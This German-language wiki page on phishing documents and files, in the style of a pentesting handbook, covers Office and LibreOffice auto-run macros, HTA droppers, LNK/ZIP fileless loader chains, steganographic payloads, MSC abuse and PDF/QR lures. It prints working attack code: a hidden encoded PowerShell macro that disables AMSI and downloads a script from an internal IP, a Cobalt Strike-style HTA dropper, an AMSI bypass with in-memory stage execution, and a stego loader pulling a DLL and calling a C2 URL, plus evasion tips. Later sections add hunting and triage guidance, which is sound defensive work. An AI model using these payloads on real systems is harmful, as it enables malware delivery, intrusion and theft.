# Phishing-Dateien & Dokumente

{{#include ../../banners/hacktricks-training.md}}

## Office-Dokumente

Microsoft Word führt vor dem Öffnen einer Datei eine Datenvalidierung durch. Diese erfolgt in Form einer Identifizierung der Datenstruktur anhand des OfficeOpenXML-Standards. Tritt bei der Identifizierung der Datenstruktur ein Fehler auf, wird die analysierte Datei nicht geöffnet.

Word-Dateien mit Makros verwenden normalerweise die Erweiterung `.docm`. Es ist jedoch möglich, die Dateierweiterung zu ändern und die Makrofunktionalität trotzdem beizubehalten.\
Eine RTF-Datei unterstützt beispielsweise von Haus aus keine Makros. Eine in RTF umbenannte DOCM-Datei wird jedoch von Microsoft Word verarbeitet und kann Makros ausführen.\
Dieselben internen Abläufe und Mechanismen gelten für alle Programme der Microsoft Office Suite (Excel, PowerPoint usw.).

Mit dem folgenden Befehl kannst du prüfen, welche Erweiterungen von bestimmten Office-Programmen ausgeführt werden:

```bash
assoc | findstr /i "word excel powerp"
```

DOCX-Dateien, die auf eine Remote-Vorlage verweisen (Datei – Optionen – Add-Ins – Verwalten: Vorlagen – Los), die Makros enthält, können ebenfalls Makros „ausführen“.

### Externes Laden von Bildern

Gehe zu: _Einfügen --> Schnellbausteine --> Feld_\
_**Kategorien**: Verknüpfungen und Verweise, **Feldnamen**: includePicture und **Dateiname oder URL**:_ http://<ip>/whatever

![Office-Dokumente – Externes Laden von Bildern: Gehe zu: Einfügen -- Schnellbausteine -- Feld](<../../images/image (155).png>)

### Makro-Backdoor

Es ist möglich, Makros zu verwenden, um beliebigen Code aus dem Dokument auszuführen.

#### Autoload-Funktionen

Je häufiger sie vorkommen, desto wahrscheinlicher werden sie von der AV erkannt.

- AutoOpen()
- Document_Open()

#### Beispiele für Makrocode

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Metadaten manuell entfernen

Gehe zu **Datei > Informationen > Dokument überprüfen > Dokument überprüfen**. Dadurch wird der Dokumentinspektor geöffnet. Klicke auf **Überprüfen** und dann neben **Dokumenteigenschaften und persönliche Informationen** auf **Alle entfernen**.

#### Dateierweiterung

Wähle anschließend im Dropdown-Menü **Dateityp** das Format **Word 97–2003 `.doc`** statt **`.docx`** aus.\
Der Grund: Du **kannst Makros nicht in einer `.docx`-Datei speichern**, und die Makro-fähige Erweiterung **`.docm`** hat einen **schlechten Ruf** (z. B. hat das Vorschausymbol ein großes `!`, und manche Web-/E-Mail-Gateways blockieren solche Dateien vollständig). Daher ist die **ältere `.doc`-Erweiterung der beste Kompromiss**.

#### Generatoren für schädliche Makros

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice-ODT-Auto-Run-Makros (Basic)

LibreOffice-Writer-Dokumente können Basic-Makros einbetten und automatisch ausführen, wenn die Datei geöffnet wird. Dazu wird das Makro an das Ereignis **Dokument öffnen** gebunden (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Ein einfaches Reverse-Shell-Makro sieht so aus:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Beachte die doppelten Anführungszeichen (`""`) innerhalb der Zeichenfolge – LibreOffice Basic verwendet sie, um Anführungszeichen als Zeichen zu maskieren. Daher bleiben bei Payloads, die mit `...==""")` enden, sowohl der innere Befehl als auch das `Shell`-Argument korrekt geklammert.

Tipps zur Zustellung:

- Speichere die Datei als `.odt` und verknüpfe das Makro mit dem Dokumentereignis, damit es sofort beim Öffnen ausgeführt wird.
- Verwende beim E-Mail-Versand mit `swaks` `--attach @resume.odt` (das `@` ist erforderlich, damit die Dateibytes und nicht die Zeichenfolge des Dateinamens als Anhang gesendet werden). Das ist entscheidend, wenn SMTP-Server ausgenutzt werden, die beliebige `RCPT TO`-Empfänger ohne Validierung akzeptieren.

## HTA-Dateien

Eine HTA ist ein Windows-Programm, das **HTML und Skriptsprachen (wie VBScript und JScript) kombiniert**. Es erzeugt die Benutzeroberfläche und wird als „voll vertrauenswürdige“ Anwendung ausgeführt, ohne den Einschränkungen des Sicherheitsmodells eines Browsers zu unterliegen.

Eine HTA wird mit **`mshta.exe`** ausgeführt, die typischerweise zusammen mit **Internet Explorer installiert** wird. Daher ist `mshta` von IE abhängig. Wenn IE also deinstalliert wurde, können HTAs nicht ausgeführt werden.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Gefälschte Anhangskarten in HTML-E-Mails

Eine HTML-E-Mail kann die native Vorschaukarte eines Anbieters nachahmen, anstatt einen echten Anhang zu enthalten. Talos beobachtete eine nachgebildete Gmail-Karte, die aus vier Base64-kodierten Inline-PNG-MIME-Teilen aufgebaut war. Das gesamte visuelle Element war in einen einzigen Anker eingebettet, und ein Empfängerwert in `?m=<target-id>` ermöglichte das Tracking pro Empfänger. Der Link begann mit `//` statt mit `http://` oder `https://`; Browser lösen diese protokollrelative Form auf, aber URL-Extraktoren, die nur vollständig qualifizierte URLs erkennen, können sie übersehen.<sup>[[11]](#references)</sup>

Untersuche während der Analyse das rohe MIME, statt der gerenderten Anhangsliste zu vertrauen. Rekonstruiere, wie die Inline-Bildteile die visuelle Karte bilden, identifiziere den umschließenden Anker und normalisiere protokollrelative `href`-Werte, bevor du URLs extrahierst.<sup>[[11]](#references)</sup>

Informationen zu Spoofing von Envelope-/Header-Absendern und DMARC-Alignment-Tests findest du unter [Gegenmaßnahmen gegen SMTP-Mail-Spoofing](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender).

## NTLM-Authentifizierung erzwingen

Es gibt mehrere Möglichkeiten, **NTLM-Authentifizierung „remote“ zu erzwingen**. Du könntest zum Beispiel **unsichtbare Bilder** in E-Mails oder HTML einfügen, auf das der Benutzer zugreifen wird (sogar HTTP MitM?). Oder sende dem Opfer die **Adresse von Dateien**, die allein durch das **Öffnen des Ordners** eine **Authentifizierung** auslösen.

**Weitere Ideen und Details findest du auf den folgenden Seiten:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Vergiss nicht, dass du nicht nur den Hash oder die Authentifizierung stehlen, sondern auch **NTLM-Relay-Angriffe durchführen** kannst:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + in ZIP eingebettete Payloads (fileless chain)

Hocheffektive Kampagnen versenden eine ZIP-Datei mit zwei legitimen Täuschungsdokumenten (PDF/DOCX) und einer bösartigen .lnk-Datei. Der Trick: Der eigentliche PowerShell-Loader ist nach einem eindeutigen Marker in den rohen Bytes der ZIP-Datei gespeichert, und die .lnk-Datei extrahiert und führt ihn vollständig im Arbeitsspeicher aus.<sup>[[2]](#references)</sup>

Typischer Ablauf des von der PowerShell-One-Liner-Datei .lnk implementierten Vorgangs:

1) Die ursprüngliche ZIP-Datei an üblichen Speicherorten suchen: Desktop, Downloads, Documents, %TEMP%, %ProgramData% und im übergeordneten Verzeichnis des aktuellen Arbeitsverzeichnisses.
2) Die ZIP-Bytes lesen und nach einem fest codierten Marker suchen (z. B. xFIQCV). Alles nach dem Marker ist die eingebettete PowerShell-Payload.
3) Die ZIP-Datei nach %ProgramData% kopieren, dort entpacken und das Täuschungsdokument .docx öffnen, damit der Vorgang legitim wirkt.
4) AMSI für den aktuellen Prozess umgehen: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Die nächste Stage deobfuskieren (z. B. alle #-Zeichen entfernen) und im Arbeitsspeicher ausführen.

Beispiel für ein PowerShell-Grundgerüst zum Extrahieren und Ausführen der eingebetteten Stage:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Notizen
- Die Auslieferung missbraucht häufig Subdomains seriöser PaaS-Anbieter (z. B. *.herokuapp.com) und kann Payloads hinter Bedingungen verbergen (etwa harmlose ZIP-Dateien abhängig von IP/UA ausliefern).
- Die nächste Stufe entschlüsselt häufig Base64-/XOR-Shellcode und führt ihn über Reflection.Emit + VirtualAlloc aus, um Spuren auf der Festplatte zu minimieren.

Persistenz innerhalb derselben Angriffskette
- COM-TypeLib-Hijacking des Microsoft-Webbrowser-Steuerelements, sodass IE/Explorer oder jede App, die es einbettet, die Payload automatisch erneut startet.<sup>[[2]](#references)[[4]](#references)</sup> Details und sofort einsetzbare Befehle finden Sie hier:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Threat Hunting/IOCs
- ZIP-Dateien, die eine angehängte ASCII-Markierungszeichenfolge (z. B. xFIQCV) hinter den Archivdaten enthalten.
- `.lnk`, die übergeordnete Ordner und Benutzerordner durchsuchen, um die ZIP-Datei zu finden, und ein Köderdokument öffnen.
- AMSI-Manipulation über [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Lange laufende geschäftliche E-Mail-Verläufe, die mit Links zu vertrauenswürdigen PaaS-Domains enden.

## LNK-Staging mit Köder zuerst → Persistenz über geplante Tasks → vertrauenswürdiges CPL side-loading

Ein weiteres wiederkehrendes Muster ist eine **als Dokument getarnte `.lnk`**, die sofort einen harmlosen Köder öffnet, während sie im Hintergrund die eigentliche Angriffskette vorbereitet.<sup>[[3]](#references)</sup>

Beobachteter Ablauf:
1. Die Verknüpfung **tarnt sich als PDF** und verwendet `conhost.exe` oder einen ähnlichen Proxy, um einen verschleierten PowerShell-Downloader zu starten.
2. PowerShell zerlegt offensichtliche Tokens (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), sodass einfache Erkennungen, die nach `iwr`, `gci`, `ren`, `cpi` oder `schtasks` suchen, den Befehl übersehen.
3. Der Stager lädt **zuerst das Köderdokument** herunter und öffnet es für das Opfer. Anschließend rekonstruiert er im Hintergrund die schädlichen Dateien.
4. Payloads können mit **irreführenden Dateiendungen** geschrieben und anschließend durch Entfernen von Füllzeichen umbenannt werden. Dadurch treten offensichtliche `.exe`-/`.cpl`-Artefakte erst später auf.
5. Die Persistenz wird mit einem **minutenbasierten geplanten Task** eingerichtet, der eine vertrauenswürdige Host-Binärdatei von einem benutzerbeschreibbaren Pfad startet.

Minimale Hunting-Hinweise zu diesem Muster:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Ein nützliches Staging-Layout, das man erkennen sollte:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` oder `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Warum die zweite Stufe unauffällig ist

In der Rapid7-Fallstudie startete die geplante Aufgabe wiederholt **`Fondue.exe`** aus `C:\Users\Public\`. Da **`APPWIZ.cpl`** daneben abgelegt war und **`RunFODW`** exportierte, lud die vertrauenswürdige Microsoft-Binärdatei die angreiferseitige CPL per Side-Loading statt der legitimen Systemkopie.

Die CPL:
- Liest einen **AES-256-CBC**-Blob aus `C:\Windows\Tasks\editor.dat`
- Entschlüsselt ihn über **Windows CNG / `bcrypt.dll`**
- Weist ausführbaren Speicher zu und kopiert den entschlüsselten Shellcode hinein
- Führt ihn indirekt aus, indem sie den Shellcode-Zeiger als Callback für **`EnumUILanguagesW`** übergibt

Dieser letzte Schritt sollte separat untersucht werden: Malware vermeidet oft einen direkten Sprung wie `((void(*)())buf)()` und missbraucht stattdessen eine **legitime WinAPI-Funktion, die einen Callback entgegennimmt**, um die Ausführung zu übertragen.

Die entschlüsselte Payload in dieser Kampagne war **Donut**-Shellcode, der anschließend die finale PE vollständig im Speicher abbildete und **AMSI/WLDP/ETW** im aktuellen Prozess patchte, bevor die Ausführung übergeben wurde. Ausführlichere Hinweise zu Side-Loading und speicherresidenter Nachverarbeitung finden Sie hier:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Praktische Ansatzpunkte für die Suche:
- `.lnk`, die `powershell.exe` oder `conhost.exe` starten, gefolgt von einem sichtbaren Täuschdokument.
- Kurzlebige Downloads nach **`C:\Users\Public\`**, gefolgt von sofortigen Umbenennungen mit unsinnigen Erweiterungen.
- Geplante Aufgaben mit unauffälligen Namen wie `GoogleErrorReport`, die aus **benutzerschreibbaren Verzeichnissen** ausgeführt werden.
- Vertrauenswürdige Binärdateien, die **`.cpl` / `.dll`**-Dateien aus demselben Nicht-Systemverzeichnis laden.
- Base64-Textblobs, die unter **`C:\Windows\Tasks\`** geschrieben und anschließend vom per Side-Loading geladenen Modul gelesen werden.

## Durch Steganografie abgegrenzte Payloads in Bildern (PowerShell-Stager)

Aktuelle Loader-Ketten liefern ein verschleiertes JavaScript/VBS aus, das einen Base64-PowerShell-Stager dekodiert und ausführt. Dieser Stager lädt ein Bild herunter (häufig GIF), das eine Base64-kodierte .NET-DLL als Klartext zwischen eindeutigen Start- und Endmarkierungen verbirgt. Das Skript sucht nach diesen Begrenzungen (in freier Wildbahn beobachtete Beispiele: «<<sudo_png>> … <<sudo_odt>>>»), extrahiert den dazwischenliegenden Text, dekodiert ihn per Base64 in Bytes, lädt die Assembly in den Speicher und ruft eine bekannte Einstiegsmethode mit der C2-URL auf.<sup>[[5]](#references)</sup>

Ablauf
- Stufe 1: Archivierter JS/VBS-Dropper → dekodiert eingebettetes Base64 → startet den PowerShell-Stager mit -nop -w hidden -ep bypass.
- Stufe 2: PowerShell-Stager → lädt ein Bild herunter, extrahiert das durch Markierungen abgegrenzte Base64, lädt die .NET-DLL in den Speicher und ruft ihre Methode auf (z. B. VAI), wobei die C2-URL und Optionen übergeben werden.
- Stufe 3: Der Loader ruft die finale Payload ab und injiziert sie üblicherweise per Process Hollowing in eine vertrauenswürdige Binärdatei (häufig MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Weitere Informationen zu Process Hollowing und Proxy-Ausführung über vertrauenswürdige Hilfsprogramme finden Sie hier:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell-Beispiel zum Extrahieren einer DLL aus einem Bild und Aufrufen einer .NET-Methode im Speicher:

<details>
<summary>PowerShell-Extraktor für Stego-Payloads und Loader</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Hinweise
- Dies ist ATT&CK T1027.003 (Steganografie/Marker-Verstecken).<sup>[[6]](#references)</sup> Marker unterscheiden sich zwischen Kampagnen.
- AMSI/ETW-Bypass und String-Deobfuscation werden häufig vor dem Laden der Assembly angewendet.
- Hunting: heruntergeladene Bilder auf bekannte Trennzeichen prüfen; PowerShell-Prozesse identifizieren, die auf Bilder zugreifen und unmittelbar Base64-Blobs decodieren.

Siehe auch Stego-Tools und Carving-Techniken:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS-Droppers → Base64-PowerShell-Staging

Eine wiederkehrende Anfangsstufe ist eine kleine, stark obfuskierte `.js`- oder `.vbs`-Datei, die in einem Archiv ausgeliefert wird. Ihr einziger Zweck ist es, einen eingebetteten Base64-String zu decodieren und PowerShell mit `-nop -w hidden -ep bypass` zu starten, um die nächste Stufe über HTTPS zu laden.<sup>[[5]](#references)</sup>

Grundlegende Logik (abstrakt):
- Eigenen Dateiinhalt lesen
- Einen Base64-Blob zwischen Füllstrings finden
- In ASCII-PowerShell decodieren
- Mit `wscript.exe`/`cscript.exe` ausführen, das `powershell.exe` startet

Hunting-Hinweise
- Archivierte JS/VBS-Anhänge, die `powershell.exe` mit `-enc`/`FromBase64String` in der Befehlszeile starten.
- `wscript.exe`, das `powershell.exe -nop -w hidden` aus Benutzer-Temp-Verzeichnissen startet.

## MSC-Dokumente als Ausführungscontainer (GrimResource)

Microsoft Management Console-Dateien (`.msc`) sind XML-Konsolendefinitionen, die normalerweise mit `mmc.exe` geöffnet werden. **GrimResource** missbraucht eine `StringTable`-Referenz auf eine `apds.dll`-Ressource mit einem alten XSS-Primitive, sodass beim Öffnen der präparierten Konsole durch einen Benutzer JavaScript innerhalb von `mmc.exe` ausgeführt wird. Beobachtete Samples kombinierten Obfuskation auf Basis von `transformNode` mit **DotNetToJScript**, um eine .NET-Payload ohne den üblichen Office-Makro-Pfad zu instanziieren.<sup>[[9]](#references)</sup>

Bei der statischen Triage eine nicht vertrauenswürdige MSC-Datei als Text behandeln und **nicht** doppelt anklicken:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Signale mit hoher Aussagekraft zur Laufzeit sind, wenn `mmc.exe` die CLR- oder Skriptkomponenten lädt, Netzwerkverbindungen herstellt oder `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` oder eine unerwartete ausführbare Datei startet. Das Format ist legitim; Erkennungen sollten daher **Herkunft + verdächtige XML-/Skriptinhalte + Verhalten von `mmc.exe`** korrelieren, statt jede MSC-Datei zu blockieren.<sup>[[9]](#references)</sup>

## PDF-/QR-Weiterleitungen und Payload-Gating

Ein PDF benötigt keinen Exploit, um nützlich zu sein. In aktuellen Kampagnen werden **QR-Codes oder gewöhnliche Links** in harmlos wirkende Dokumente eingefügt, die Browsersitzung an den E-Mail-Sicherheitskontrollen vorbeigeführt und das Ziel mit der Empfängeradresse personalisiert. Microsoft dokumentierte 2025 PDFs, deren QR-URLs für jeden Empfänger einzigartig waren und zu einer Infrastruktur für das Abgreifen von RaccoonO365-Zugangsdaten führten; eine parallele Angriffskette nutzte IP-/Umgebungs-Gating, um ausgewählten Besuchern einen JavaScript-/MSI-Pfad, Scannern oder nicht zugelassenen Clients jedoch ein harmloses PDF bereitzustellen.<sup>[[10]](#references)</sup>

Prüfe sowohl PDF-Aktionen als auch gerenderte QR-Codes. Ein QR-Code kann als Vektorgrafik gezeichnet sein, statt als extrahierbares Bild gespeichert zu werden. Rastere daher alle Seiten und extrahiere außerdem eingebettete Bilder:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Untersuchen Sie dekodierte Ziele und Weiterleitungen von einem isolierten Analysesystem aus, ohne sich zu authentifizieren. Nützliche Hunting-Merkmale sind PDFs, die ausschließlich QR-Codes enthalten, nahezu leere E-Mail-Nachrichten, die E-Mail-Adresse des Empfängers in einem Query-Parameter, mehrere Weiterleitungen über renommierte Hosting-Anbieter sowie unterschiedliche Inhalte je nach IP-Adresse, Geolocation, Cookies, Referrer oder User-Agent. Vergleichen Sie Anfragen mit kontrollierten Profilen, da ein einzelner Sandbox-Abruf möglicherweise nur den Köder erhält.<sup>[[10]](#references)</sup>

## Windows-Dateien zum Stehlen von NTLM-Hashes

Siehe die Seite zu **Orten, an denen NTLM-Creds gestohlen werden können**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice-Makro → IIS-Webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine-Kampagne: Ein raffinierter Phishing-Angriff auf US-Unternehmen](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Die Tracking-Techniken von Dropping Elephant anhand einer China-bezogenen Loader-Kette nachverfolgen](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – Neue COM-Persistenztechnik (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader liefert eine Reihe von Infostealern aus](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganografie (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Ausführung über vertrauenswürdige Entwicklerprogramme: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console für den Erstzugriff und zur Umgehung von Sicherheitsmaßnahmen](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Bedrohungsakteure nutzen die Steuersaison für steuerbezogene Phishing-Kampagnen](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
- [11] [Cisco Talos – UAT-11587-Auslieferungskette und Antino-Backdoor](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
{{#include ../../banners/hacktricks-training.md}}
